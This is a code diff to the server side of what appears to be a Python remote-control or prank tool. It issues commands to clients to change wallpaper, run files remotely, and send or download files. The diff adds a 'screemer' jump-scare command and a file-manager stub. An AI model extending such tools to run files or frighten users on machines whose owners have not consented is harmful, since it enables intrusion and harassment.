@@ -113,6 +113,11 @@ class Server(ctk.CTk):
                         filepath = message[13:].strip()
                         print(f'Sended wallpaper: {filepath}')
                         threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()
+                    
+                    elif 'screemer' in message:
+                        filepath = message[8:].strip()
+                        print(f'Sended wallpaper: {filepath}')
+                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()
 
                     elif 's_run' in message:
                         filepath = message[5:].strip()
@@ -341,10 +346,21 @@ class CommandFunction:
         if file_path:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, f's_run {file_path}'), daemon=True).start()
     
+    def screemer(self, ip, port):
+        print("Screemer in dev")
+        """
+        file_path = filedialog.askopenfilename(title="Select file")
+        if file_path:
+            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'screemer {file_path}'), daemon=True).start()
+        """
+        
     def send_file(self, ip, port):
         file_path = filedialog.askopenfilename(title="Select file")
         if file_path:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, f'send {file_path}'), daemon=True).start()
+
+    def file_manager(self, ip, port):
+        print(f"FileManager {ip} {port}")
 
     def download_file(self, ip, port, filename):
         threading.Thread(target=self.server.send_to_client, args=(ip, port, f'download {filename}'), daemon=True).start()
